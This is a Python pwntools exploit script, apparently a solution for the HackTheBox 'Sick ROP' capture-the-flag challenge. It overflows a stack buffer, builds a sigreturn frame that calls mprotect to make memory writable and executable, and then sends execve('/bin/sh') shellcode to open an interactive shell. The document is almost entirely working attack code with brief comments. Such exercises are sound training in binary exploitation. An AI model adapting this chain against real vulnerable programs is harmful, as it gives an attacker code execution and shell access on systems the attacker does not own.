#sick_rop
import os
from pwn import *

#setup environment
level = "Sick ROP"
ip = "188.166.175.0:30660"
os.chdir("/home/ayush/Work/HackTheBox/Challenges/PWN/"+level)
print(os.getcwd())

#setup rop
context.arch = 'amd64'
elf = ELF("./sick_rop")

#init local process
r = process("./sick_rop")

#init remote process
# r = remote(ip.split(':')[0], ip.split(':')[1])

#padding for return address overflow limit
overflow_length = 0x20 + 0x8 # buffer space + RSP space
padding = b'A' * overflow_length

#setup sigreturn to change register values to call mprotect() to get new executable stack and then call vuln again
vuln_ptr = 0x004010d8      #pointer to the location that stores the begin addr of vuln() which is the address of instruction to call vuln() in start
syscall_addr = 0x00401014       #syscall address

frame = SigreturnFrame()
frame.rax = constants.SYS_mprotect
# All arguments for mprotect syscall
frame.rdi = 0x400000    # Virtual address of binary
frame.rsi = 0x10000 # length of space to change its protection
frame.rdx = 0x7     # set protection to allow RWX
# new RSP must be a pointer to vuln() to jump to it for the next BoF
frame.rsp = vuln_ptr
# Address of Syscall Instruction
frame.rip = syscall_addr

#first call to vuln to set rax to 0xF for rt_sigreturn() syscall
vuln_addr = p64(elf.symbols['vuln'])
syscall_addr = p64(0x0000000000401014)

payload = padding + vuln_addr + syscall_addr + bytes(frame)
r.sendline(payload)

#setup "value" in rax register - length of read line + 1 
value = 0xF
payload = "A"*(value-1)
r.sendline(payload)

#setup shellcode for the exploit
shellcode_string = """mov rdi, 0x68732f6e69622f 
                push rdi
                mov rdi, rsp
                mov rax, 0x3b
                xor rsi, rsi
                xor rdx, rdx
                syscall""" #0x68732f6e69622f is "\bin\sh\x00" in reverse due to little-endian
shellcode = asm(shellcode_string)
shellcode_addr = p64(vuln_ptr + 0x10)    #+0x10 to point to the next address to the pointer to vuln function(now the new stack pointer)

#send shellcode
payload = padding + shellcode_addr + shellcode
r.sendline(payload)

r.interactive()
